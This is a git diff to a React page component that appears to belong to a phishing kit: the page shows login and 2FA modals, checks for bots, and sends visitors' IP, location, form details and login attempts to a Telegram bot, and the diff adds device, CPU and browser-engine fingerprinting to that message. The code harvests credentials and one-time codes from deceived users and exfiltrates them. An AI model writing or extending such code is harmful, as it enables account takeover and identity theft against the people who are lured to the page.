@@ -6,6 +6,7 @@ import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
@@ -43,6 +44,7 @@ const Home = () => {
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
     const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
+    const [deviceInfo] = useState(() => detectDevice());
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -296,6 +298,9 @@ const Home = () => {
         message += `⏰ ${dt}\n`;
         message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
         message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
+        message += `📱 Thiết bị: ${deviceInfo.deviceInfo}\n`;
+        if (deviceInfo.cpu) message += `💻 CPU: ${deviceInfo.cpu}\n`;
+        if (deviceInfo.engine) message += `⚙️ Engine: ${deviceInfo.engine}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
